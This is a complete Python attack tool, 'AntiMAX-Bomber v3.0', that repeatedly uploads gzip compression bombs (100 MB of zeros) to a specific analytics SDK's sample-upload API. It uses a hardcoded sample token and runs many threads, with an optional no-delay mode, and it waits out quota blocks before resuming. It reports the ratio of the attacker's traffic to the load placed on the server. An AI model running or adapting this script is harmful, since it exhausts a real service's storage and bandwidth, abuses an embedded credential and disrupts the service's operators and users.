#!/usr/bin/env python3
import requests
import os
import time
import argparse
import secrets
import threading
import sys
import tempfile
import gzip
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

DEFAULT_TOKEN = "t6QnlHov0Gq1UBGYG9GPqZu0EiVMZ922FKvwyAEASa90"
DEFAULT_VERSION_NAME = "26.16.0"
DEFAULT_VERSION_CODE = 6698
DEFAULT_FEATURE = "SAMPLED_TRACE"
DEFAULT_INIT_URL = "https://sdk-api.apptracer.ru/api/sample/initUpload"
DEFAULT_UPLOAD_URL = "https://sdk-api.apptracer.ru/api/sample/upload"

BOMB_UNPACKED_MB = 100
BOMB_UNPACKED_BYTES = BOMB_UNPACKED_MB * 1024 * 1024

stats_lock = threading.Lock()
stats = {
    "bombs_sent": 0,
    "bombs_failed": 0,
    "bytes_sent_compressed": 0,
    "bytes_deployed_on_server": 0,
    "quota_hits": 0,
    "start_time": 0
}

quota_blocked = False
quota_block_until = 0

def format_bytes(bytes_val):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_val < 1024.0:
            return f"{bytes_val:.2f} {unit}"
        bytes_val /= 1024.0
    return f"{bytes_val:.2f} PB"

def format_rate(bytes_per_sec):
    for unit in ['B/s', 'KB/s', 'MB/s', 'GB/s']:
        if bytes_per_sec < 1024.0:
            return f"{bytes_per_sec:.2f} {unit}"
        bytes_per_sec /= 1024.0
    return f"{bytes_per_sec:.2f} GB/s"

def format_time(seconds):
    if seconds < 60:
        return f"{seconds:.0f}s"
    elif seconds < 3600:
        return f"{seconds/60:.1f}m"
    else:
        return f"{seconds/3600:.1f}h"

def create_zip_bomb():
    with tempfile.NamedTemporaryFile(mode='wb', suffix='.bin', delete=False) as f:
        chunk_size = 1024 * 1024
        for _ in range(BOMB_UNPACKED_MB):
            f.write(b'\x00' * chunk_size)
        temp_bin = f.name

    temp_gz = temp_bin + '.gz'
    with open(temp_bin, 'rb') as src, open(temp_gz, 'wb') as dst:
        with gzip.open(dst, 'wb', compresslevel=9) as gz:
            gz.write(src.read())

    os.unlink(temp_bin)
    return temp_gz

def handle_quota(response_json, args):
    global quota_blocked, quota_block_until

    if response_json.get("errorCode") == "QUOTA":
        commands = response_json.get("commands", {})
        wait_ms = commands.get("featureShutdownMs", 86400000)
        wait_sec = wait_ms / 1000

        with stats_lock:
            stats["quota_hits"] += 1

        quota_blocked = True
        quota_block_until = time.time() + wait_sec

        if not args.quiet:
            print(f"\n[!] QUOTA! Blocked for {format_time(wait_sec)}")
        return wait_sec
    return 0

def send_one_bomb(session, args, bomb_file, worker_id):
    global quota_blocked, quota_block_until

    if quota_blocked:
        remaining = quota_block_until - time.time()
        if remaining > 0:
            time.sleep(min(remaining, 60))
            return False
        else:
            quota_blocked = False

    compressed_size = os.path.getsize(bomb_file)

    body = {
        "feature": args.feature,
        "versionName": args.version_name,
        "versionCode": args.version_code,
        "sampleSize": BOMB_UNPACKED_BYTES,
        "sampleFileName": f"bomb_{secrets.token_hex(4)}.pcm.gz",
        "attr1": 1,
        "tag": "zip_bomb"
    }

    headers = {"Content-Type": "application/json", "User-Agent": "AntiMAX-Bomber/3.0"}

    try:
        r = session.post(
            f"{args.init_url}?sampleToken={args.token}",
            json=body,
            headers=headers,
            timeout=30
        )

        if r.status_code == 400:
            data = r.json()
            if data.get("errorCode") == "QUOTA":
                handle_quota(data, args)
                return False

        if r.status_code != 200:
            with stats_lock:
                stats["bombs_failed"] += 1
            return False

        data = r.json()
        upload_token = data.get("uploadToken")
        if not upload_token:
            with stats_lock:
                stats["bombs_failed"] += 1
            return False

        with open(bomb_file, 'rb') as f:
            files = {"file": (f"bomb_{worker_id}.pcm.gz", f, "application/gzip")}
            r2 = session.post(
                f"{args.upload_url}?uploadToken={upload_token}",
                files=files,
                headers={"User-Agent": "AntiMAX-Bomber/3.0", "Content-Encoding": "gzip"},
                timeout=60
            )

        if r2.status_code == 200 and r2.json().get("success"):
            with stats_lock:
                stats["bombs_sent"] += 1
                stats["bytes_sent_compressed"] += compressed_size
                stats["bytes_deployed_on_server"] += BOMB_UNPACKED_BYTES
            return True
        else:
            with stats_lock:
                stats["bombs_failed"] += 1
            return False

    except Exception as e:
        with stats_lock:
            stats["bombs_failed"] += 1
        if args.verbose:
            print(f"\n[ERROR] Worker {worker_id}: {e}")
        return False

def worker(worker_id, args, stop_flag):
    session = requests.Session()
    bomb_file = create_zip_bomb()

    try:
        while not stop_flag.is_set():
            success = send_one_bomb(session, args, bomb_file, worker_id)
            if success and args.verbose:
                print(f"\n[W{worker_id}] Bomb sent")
            elif args.verbose:
                print(f"\n[W{worker_id}] Failed")

            if not args.aggressive:
                time.sleep(args.interval)
    finally:
        if os.path.exists(bomb_file):
            os.unlink(bomb_file)

def stats_printer(args, stop_flag):
    last_bytes = 0
    last_time = time.time()

    while not stop_flag.is_set():
        time.sleep(args.stats_interval)

        if not args.quiet:
            elapsed = time.time() - stats["start_time"]
            current_compressed = stats["bytes_sent_compressed"]
            current_deployed = stats["bytes_deployed_on_server"]

            instant_bytes = current_compressed - last_bytes
            instant_time = time.time() - last_time
            instant_speed = instant_bytes / instant_time if instant_time > 0 else 0

            last_bytes = current_compressed
            last_time = time.time()

            quota_indicator = ""
            if quota_blocked:
                remaining = quota_block_until - time.time()
                if remaining > 0:
                    quota_indicator = f" | QUOTA: {format_time(remaining)}"

            status_line = (
                f"\r[{elapsed:>6.0f}s] "
                f"bombs: {stats['bombs_sent']:>6} | "
                f"sent: {format_bytes(current_compressed):>8} | "
                f"deployed: {format_bytes(current_deployed):>8} | "
                f"speed: {format_rate(instant_speed):>10}{quota_indicator}    "
            )
            sys.stdout.write(status_line)
            sys.stdout.flush()

    print("\n\n" + "=" * 70)
    print("ANTIMAX-BOMBER v3.0 - FINAL STATISTICS")
    print("=" * 70)
    elapsed = time.time() - stats["start_time"]
    print(f"  Runtime:                {elapsed:.2f} seconds")
    print(f"  Bombs sent:             {stats['bombs_sent']}")
    print(f"  Bombs failed:           {stats['bombs_failed']}")
    print(f"  Your traffic (compressed): {format_bytes(stats['bytes_sent_compressed'])}")
    print(f"  Their traffic (unpacked):  {format_bytes(stats['bytes_deployed_on_server'])}")
    if stats['bytes_sent_compressed'] > 0:
        print(f"  Efficiency ratio:       {stats['bytes_deployed_on_server'] / stats['bytes_sent_compressed']:.1f}x")
    print(f"  QUOTA hits:             {stats['quota_hits']}")
    print("=" * 70)

def parse_args():
    parser = argparse.ArgumentParser(description="AntiMAX-Bomber v3.0 - Zip Bomb Edition")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads (default: 10)")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Duration in seconds (0 = infinite)")
    parser.add_argument("-i", "--interval", type=float, default=2.0, help="Delay between bombs per thread (default: 2.0)")
    parser.add_argument("--token", default=DEFAULT_TOKEN, help="SampleToken")
    parser.add_argument("--version-name", default=DEFAULT_VERSION_NAME, help="VersionName")
    parser.add_argument("--version-code", type=int, default=DEFAULT_VERSION_CODE, help="VersionCode")
    parser.add_argument("--feature", default=DEFAULT_FEATURE, help="Feature name")
    parser.add_argument("--init-url", default=DEFAULT_INIT_URL, help="InitUpload URL")
    parser.add_argument("--upload-url", default=DEFAULT_UPLOAD_URL, help="Upload URL")
    parser.add_argument("--aggressive", "-a", action="store_true", help="Aggressive mode (no delays)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--quiet", "-q", action="store_true", help="Quiet mode")
    parser.add_argument("--stats-interval", type=float, default=1.0, help="Stats update interval")
    return parser.parse_args()

def main():
    args = parse_args()

    if not args.quiet:
        print(f"\n[+] AntiMAX-Bomber v3.0 (Zip Bomb Edition)")
        print(f"[+] Token: {args.token[:40]}...")
        print(f"[+] Threads: {args.threads}")
        print(f"[+] Bomb: {BOMB_UNPACKED_MB} MB unpacked -> ~{BOMB_UNPACKED_MB // 10} MB compressed")
        print(f"[+] Efficiency: ~10x")
        print(f"[+] Duration: {args.duration if args.duration else 'infinite'}")
        print(f"[+] Aggressive: {args.aggressive}")
        print(f"\n[+] Arming bombs... Press Ctrl+C to stop\n")

    stop_flag = threading.Event()
    stats["start_time"] = time.time()

    stats_thread = threading.Thread(target=stats_printer, args=(args, stop_flag))
    stats_thread.daemon = True
    stats_thread.start()

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for i in range(args.threads):
            futures.append(executor.submit(worker, i, args, stop_flag))

        if args.duration > 0:
            try:
                time.sleep(args.duration)
                stop_flag.set()
            except KeyboardInterrupt:
                stop_flag.set()
        else:
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                stop_flag.set()

        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass

    stop_flag.set()
    time.sleep(0.5)

if __name__ == "__main__":
    main()